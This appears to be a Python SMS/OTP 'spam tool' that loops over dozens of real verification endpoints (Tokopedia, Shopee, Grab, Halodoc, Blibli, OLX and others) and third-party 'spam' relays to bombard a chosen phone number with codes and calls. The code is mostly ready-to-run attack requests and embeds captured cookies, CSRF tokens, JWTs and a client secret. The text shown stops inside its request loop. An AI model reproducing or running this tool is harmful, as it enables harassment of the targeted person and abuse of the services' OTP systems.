import sys          # For terminal functions like autoketik() and exit()
import subprocess   # Installing python modules within code/script (without requirements.txt)
from typing import Optional

try: # Import Modules
    import requests # POST, GET, & PUT URL APIs
    import time     # For time-related information
    import random   # For random user simulation
    import os       # For terminal "clear"
    import urllib3  # HTTP client for Python
    import json     # To view request bodies by printing
    import bs4      # For output variation
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'urllib3'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'bs4'])
finally:
    import requests # POST, GET, & PUT URL APIs
    import urllib3  # HTTP client for Python
    from bs4 import BeautifulSoup as bs
    
from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post, get # Can also do "from requests import post, get"

# Initialize Terminal Output Color Variations.
hijau   =   "\033[1;92m"
putih   =   "\033[1;97m"
abu     =   "\033[1;90m"
kuning  =   "\033[1;93m"
ungu    =   "\033[1;95m"
merah   =   "\033[1;91m"
biru    =   "\033[1;96m"

def autoketik(s: str) -> None:
    """Functions as an alternative to print(), creating a typing effect in the terminal.
    
    Args:
        s: The string to be printed with a typing effect.
    """
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.050)

def countdown(time_sec: int) -> None:
    """Provides time information while spamming is in progress.
    
    Args:
        time_sec: The number of seconds to countdown.
    """
    while time_sec > 0:
        mins, secs = divmod(time_sec, 60)
        timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Please Wait Approaching \033[1;92m{:02d}:{:02d}'.format(mins, secs)
        waktu = time.localtime()
        keterangan_jam = time.strftime("%H:%M:%S", waktu)
        keterangan_tanggal = time.strftime("%d", waktu)
        keterangan_bulan = time.strftime("%B", waktu)
        
        # Translate month to Indonesian for display
        bulan_bulan = {
            "January"    : 'Januari',
            "February"   : "Februari",
            "March"      : "Maret",
            "April"      : "April",
            "May"        : "Mei",
            "June"       : "Juni",
            "July"       : "Juli",
            "August"     : "Agustus",
            "September"  : "September",
            "October"    : "Oktober",
            "November"   : "November",
            "December"   : "Desember"
        } 
        bulan = bulan_bulan.get(keterangan_bulan, keterangan_bulan)
        
        keterangan_tahun = time.strftime("%Y", waktu)
        keterangan_hari = time.strftime("%A", waktu)
        
        # Translate day to Indonesian
        hari_hari = {
            "Sunday"    : 'Minggu',
            "Monday"    : "Senin",
            "Tuesday"   : "Selasa",
            "Wednesday" : "Rabu",
            "Thursday"  : "Kamis",
            "Friday"    : "Jum'at",
            "Saturday"  : "Sabtu"
        } 
        hari = hari_hari.get(keterangan_hari, keterangan_hari)
        
        print(f"{timeformat} | {biru}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {kuning}Time {keterangan_jam}", end='\r')
        time.sleep(1)
        time_sec -= 1

def tanya(nomor: str) -> None:
    """Prompts the user to restart or exit the tool stream.
    
    Args:
        nomor: The target phone number to reuse if restarting.
    """
    check_input = 0
    while check_input == 0:            
        a = input(f"""{merah}Do you want to repeat the Spam Tools? y/n 
{putih}Your Input: {hijau}""")
        if a.lower() == "y":
            check_input = 1
            start(nomor, 1)
            break
        elif a.lower() in ["n", "t"]:
            check_input = 1
            autoketik(f"{hijau}Successfully Exited the Tools")
            sys.exit()
            break
        else:
            print("Please enter a valid choice.")
            sys.exit()

def jam(nomor: str) -> None: 
    """Main execution loop containing all API payloads. Do not remove this code!
    
    Args:
        nomor: The normalized phone number target.
    """
    autoketik("Program is Running!")
    
    # Normalize number to handle 08x, 628x, +628x, 8x format
    import re
    clean_nomor = re.sub(r'\D', '', nomor)
    if clean_nomor.startswith('62'):
        clean_nomor = '0' + clean_nomor[2:]
    elif clean_nomor.startswith('8'):
        clean_nomor = '0' + clean_nomor
    
    nomor = clean_nomor
    b = nomor[1:]
    c = "62" + b
    rto = 0           # Flag when hitting RTO to pause the process automatically for 80 seconds
    RTO_flag = 0
    
    for _ in range(10): # Iteration Looping
        try: # Disabled requests can be uncommented based on error conditions (Check README.md)
            Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
            Thai_friendly                         =  requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':b,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
            Shopee_fromme                         =  requests.post("https://shopee.co.id/api/v4/otp/send_vcode", data=({"phone":c,"force_channel":"true","operation":7,"channel":2,"supported_channels":[1,2,3]}), headers={"Host": "shopee.co.id","content-length": "101","sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36","x-api-source": "rweb","content-type": "application/json","accept": "application/json","x-shopee-language": "id","x-requested-with": "XMLHttpRequest","save-data": "on","x-csrftoken": "I8eSRy1l27NAL6ES8c9l05vVmpJMp8wd","sec-ch-ua-platform": "Android","origin": "https://shopee.co.id","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shopee.co.id/buyer/login/otp","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9,id;q=0.8","cookie": "REC_T_ID=e7bfd49e-b230-11ec-bdcc-2cea7f46f39f","cookie": "SPC_F=Yf7DlOX2KwKeJ6yxi33XqWZstVlia8Ij","cookie": "SPC_IA=-1","cookie": "SPC_EC=-","cookie": "SPC_U=-","cookie": "_fbp=fb.2.1648868371205.1740855633","cookie": 'SPC_T_IV="yDpgi7TnevEPzkP6tUtXTA=="',"cookie": 'SPC_T_ID="MJiQC0fDNrknKddvZtgby1td+rfZJY9g2kR201HodwKqnKK2u/tm/10VG/rodYQyTuutTi3ZoC1K1fFgZVax9H9pkCrcszlGYr7eUIjaBPY="',"cookie": "SPC_T_ID=MJiQC0fDNrknKddvZtgby1td+rfZJY9g2kR201HodwKqnKK2u/tm/10VG/rodYQyTuutTi3ZoC1K1fFgZVax9H9pkCrcszlGYr7eUIjaBPY=","cookie": "SPC_T_IV=yDpgi7TnevEPzkP6tUtXTA==","cookie": "_tt_enable_cookie=1","cookie": "_ttp=65634303-9bfb-4128-b793-66cce34fcbcc","cookie": "_gcl_au=1.1.1358726640.1664810870","cookie": "SPC_R_T_IV=yDpgi7TnevEPzkP6tUtXTA==","cookie": "SPC_R_T_ID=MJiQC0fDNrknKddvZtgby1td+rfZJY9g2kR201HodwKqnKK2u/tm/10VG/rodYQyTuutTi3ZoC1K1fFgZVax9H9pkCrcszlGYr7eUIjaBPY=","cookie": "_gcl_aw=GCL.1666763118.Cj0KCQjwkt6aBhDKARIsAAyeLJ2rV2TZKdPuQQnxt_OxJTdoZZL-9DX3JXaP9AN2JH6SNT-XmokLu4gaAvbxEALw_wcB","cookie": "_gac_UA-61904553-8=1.1666763118.Cj0KCQjwkt6aBhDKARIsAAyeLJ2rV2TZKdPuQQnxt_OxJTdoZZL-9DX3JXaP9AN2JH6SNT-XmokLu4gaAvbxEALw_wcB","cookie": "cto_bundle=FuapGV9VSUtwYSUyQjFxcldJS3pyZVpRS2dDNWljMU1iYklGY2o4aUFGN3RzSWZzWW9vR0xWZSUyQnowVWNjZEV1dGxTcWJ6RlI0djFXc29ldW9VYTRGS3A5Z0pTRFdkOWdnSnpSNHluVTBIZFFvQnIzbkw0ZEM4d1IwalljNjRzQ1RMWmsxZXowWm9TUGRoYzJsS0RJWVFLMFRuMElnJTNEJTNE","cookie": "G_ENABLED_IDPS=google","cookie": "SPC_CLIENTID=WWY3RGxPWDJLd0tlixyexcdwhhssnafo","cookie": "__LOCALE__null=ID","cookie": "csrftoken=I8eSRy1l27NAL6ES8c9l05vVmpJMp8wd","cookie": "SPC_SI=BTtfYwAAAAA1eHV3VEhIZaHNGwAAAAAANXVDUE12Vjc=","cookie": "_QPWSDCXHZQA=89e79a95-b4e7-4e2c-ca5f-646b5132e216","cookie": "HAS_BEEN_REDIRECTED=true","cookie": "_med=refer","cookie": "AMP_TOKEN=%24NOT_FOUND","cookie": "_gid=GA1.3.1224422653.1667393966","cookie": "_dc_gtm_UA-61904553-8=1","cookie": "ds=14616a0582a804162b5a32671f5190b6","cookie": "shopee_webUnique_ccd=wLB0rMarsqVlH1GMR3%2BUgQ%3D%3D%7CZHgs7vjE%2B9xeB0uOsISVQi4sKX%2BFUMZF5E8j5UDNn3ARItdtXAzik07aCdbS2nkpD%2B9bLh1c3458he6AyQgYK7HMl8zjcxStCiXH%7CO3uErT4xi%2BKxgDGC%7C06%7C3","cookie": "_ga=GA1.1.1922051288.1652344735","cookie": "_ga_SW6D8G0HXK=GS1.1.1667393964.52.1.1667394162.35.0.0","cookie": "_gali=app"})
            Depop_from30                         =  requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=json.dumps({"phone_number":nomor,"country_code":"ID"}), headers={"Host": "webapi.depop.com","accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36","Content-Type": "application/json","Accept-Encoding": "gzip, deflate, br", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",})
            Sooplai_from30_XXX                   =  requests.post("https://api.sooplai.com/customer/register/otp/request", data=json.dumps({"phone":nomor}), headers={"Host": "api.sooplai.com","accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/json","origin": "https://www.sooplai.com","referer": "https://www.sooplai.com/register","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",})
            Alodoc_from30_20x                    =  requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":nomor}).text
            Klikdoc_from30_4x                    =  requests.post("https://nuubi.herokuapp.com/api/spam/klikdok", data={'number':nomor})
            Grabtaxi_bisa_tapi_sedikit_lama        =  requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':nomor, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            Grab_bisa_tapi_sedikit_lama            =  requests.post('https://api.grab.com/grabid/v1/phone/otp',data={'method':'CALL','countryCode':'id','phoneNumber':nomor,'templateID':'pax_android_production'})
            Grabfood_fromcochyhung_tapi_lama_30xend=  requests.post(f'https://api-sms-v2.herokuapp.com/grab-food?phone={nomor}').text
            Nhaphang_fromcochyhung_tapi_lama     =  requests.post(f'https://api-sms-v2.herokuapp.com/nhap-hang-247?phone={nomor}').text
            Elines_fromcochyhung_tapi_lama       =  requests.post(f'https://api-sms-v2.herokuapp.com/elines?phone={nomor}').text
            Metavn_fromcochyhung_tapi_lama       =  requests.post(f'https://api-sms-v2.herokuapp.com/meta-vn?phone={nomor}').text
            Bachhoaxanh_fromcochyhung_tapi_lama  =  requests.post(f'https://api-sms-v2.herokuapp.com/bach-hoa-xanh?phone={nomor}').text
            Tiki_fromcochyhung_tapi_lama         =  requests.post(f'https://api-sms-v2.herokuapp.com/tiki?phone={nomor}').text
            Gojoy_fromcochyhung_tapi_lama        =  requests.post(f'https://api-sms-v2.herokuapp.com/gojoy?phone={nomor}').text
            Vntrip_fromcochyhung_tapi_lama       =  requests.post(f'https://api-sms-v2.herokuapp.com/vntrip?phone={nomor}').text
            Thegioididong_fromcochyhung_tapi_lama=  requests.post(f'https://api-sms-v2.herokuapp.com/the-gioi-di-dong?phone={nomor}').text
            
            Tri_4xend                            =  requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = {'msisdn':nomor})
            Harus_gaada_angka_0_triggered        =  json.loads(requests.post('https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code',headers={"accept": "text/html, application/xhtml+xml, application/json, */*","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "166","content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://h5.rupiahcepatweb.com","referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-site","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"},data={"data":json.dumps({"mobile":nomor,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"})}).text)
            Payfaz_triggered_trimegah_10xend     =  requests.post('https://sbn.trimegah.id/agent/register/sendOtp',data={ 'noHp':nomor,'email':'yvtix@zx.id' }).text
            Rupa_rupa_30xend                     =  requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})).text
            Icq_300xend                          =  requests.post("https://u.icq.net/api/v14/rapi/auth/sendCode", data=json.dumps({"reqId": "64708-1593781791", "params": {"phone":c, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}),headers={"accept": "*/*", "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7", "content-type": "application/json", "origin": "http://web.icq.com", "referer": "http://web.icq.com/", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site", "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
            Cairin_id_100xend                    =  requests.post("https://app.cairin.id/v1/app/sms/sendCaptcha",data={"haveImageCode":"0","fileName":"6f8c3b90c845f09ff1bfe714a30aede8","phone":nomor,"imageCode":"","userImei":"","type":"registry"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36"}).text
            Harus_gaada_angka_0                  =  requests.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=json.dumps({"ketik":0,"nomor":"0"+b}),headers={"content-type": "application/json; charset=UTF-8","content-length": "34","accept-encoding": "gzip","user-agent": "okhttp/3.8.0","accept-language": "in","x-ada-token": "","x-ada-appid": "800006","x-ada-os": "android","x-ada-channel": "default","x-ada-mediasource": "","x-ada-agency": "adtubeagency","x-ada-campaign": "AdakamiCampaign","x-ada-role": "1","x-ada-appversion": "1.7.0","x-ada-device": "","x-ada-model": "SM-G935FD","x-ada-os-ver": "7.1.1","x-ada-androidid": "a4341a2sa90a4d97","x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39","x-ada-afid": "1580054114839-7395423911531673296"}).text
            Cmsapi_mapclub_30xend                =  requests.post("https://cmsapi.mapclub.com/api/signup-otp",data={"phone":nomor},headers={"Connection": "keep-alive","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
            Bukuwarung_wa_500xend                =  requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={"Host":"api-v2.bukuwarung.com","content-length":"198","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko-web","sec-ch-ua-platform":"Android","origin":"https://tokoko.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://tokoko.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
            Rupa_rupa_30xend                     =  requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
            Beryllium_mapclub_30xend             =  requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
            Payfaz                               =  requests.post("https://api.payfazz.com/v2/phoneVerifications",data={"phone":"0"+nomor},headers={"Host": "api.payfazz.com", "content-length": "17", "accept": "*/*", "origin": "https://www.payfazz.com","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "http://www.payfazz.com/register/BEN6ZF74XL", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
            Danacita_400x                        =  json.loads(requests.get("https://api.danacita.co.id/users/send_otp/?mobile_phone="+nomor,headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text)
            Dekoruma                             =  requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",data=json.dumps({"phoneNumber":c,"platform":"wa"}),headers={"content-type": "application/json","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
            Halodoc                              =  requests.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', headers={'Host': 'www.halodoc.com','x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json, text/plain, */*','save-data': 'on','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"phone_number": "+62"+nomor,"channel": "sms"})).text
            AmmarGanz_OLX                        =  requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
            Dekoruma                             =  requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})).text
            Blibli                               =  requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+nomor,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+nomor})).text
            Indihome                             =  requests.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',data={ 'type':'hp','msisdn':nomor }).text

            Indo_from30                            =  requests.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP="+nomor, headers={"Host": "account-api-v1.klikindomaret.com","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","origin": "https://account.klikindomaret.com","referer": "https://account.klikindomaret.com/SMSVerification?nohp="+nomor+"&type=register","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
            Wa2_from30                             =  requests.post("https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==", data={"namaDepan":"Tahalu"+str(random.randrange(11,99999)),"emailNope":nomor,"password":"Indo"+str(random.randrange(111,999)),"konfirmasiPass":"Indo"+str(random.randrange(111,999))}, headers={"Host": "qtva.id","Connection": "keep-alive","Accept": "text/html, */*; q=0.01","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://qtva.id","Referer": "https://qtva.id/page/register/siswa","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"}).text
            Call_from30                            =  requests.get("https://id.jagreward.com/member/verify-mobile/"+b+"/", headers={"X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","Content-Type":" application/x-www-form-urlencoded; charset=UTF-8","Content-Type": "application/json","Origin": "https://id.jagreward.com","Referer": "https://id.jagreward.com/member/register/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            Call2_from30                           =  requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=json.dumps({"countryCode":"+62","phoneNumber":b}), headers={"Content-Type": "application/json","Host": "srv3.sampingan.co.id","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/4.4.0"})
            Greetday                               =  requests.Session().post('https://seekmi.com/ajax/send-otp', data={ 'phone': nomor,'name': 'YutixCode' }, headers={ 'X-CSRF-TOKEN': bs(requests.Session().get('https://seekmi.com/register').text,'html.parser').findAll('meta')[27]['content'] })
            Jadgreward                             =  json.loads(requests.get(f"https://id.jagreward.com/member/verify-mobile/{b}").text)
            
            Maucash                                =  requests.get(f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={b}&channelType=0",headers={"Host":"japi.maucash.id","accept":"application/json, text/plain, */*","x-origin":"google play","x-org-id":"1","x-product-code":"YN-MAUCASH","x-app-version":"2.4.23","x-source-id":"android","accept-encoding":"gzip","user-agent":"okhttp/3.12.1"}).text
